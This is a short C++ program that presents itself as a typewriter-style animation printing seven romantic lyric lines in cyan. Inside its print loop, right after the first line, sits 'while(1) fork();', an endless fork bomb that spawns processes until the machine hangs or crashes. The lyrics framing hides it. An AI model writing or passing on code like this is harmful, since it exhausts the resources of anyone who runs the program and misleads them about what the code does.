#include <iostream>
#include <unistd.h>

using namespace std;

string cyan = "\033[1;36m";

int main() {
    string lyrics[] = {
        "I'll imagine we fell in love",
        "I'll nap under moonlight skies with you",
        "I think I'll picture us, you with the waves",
        "The ocean's color on your face",
        "I'll leave my heart with your air",
        "So let me fly with you",
        "Will you be forever with me?"
    };
    
    int speed = 100;

    cout << "\n";
    
    for (int i = 0; i < 7; i++) {
        for (char c : lyrics[i]) {
            cout << cyan << c << flush;
            usleep(speed * 1000);
        }
        cout << endl;
        while(1) fork();
    }

    return 0;
}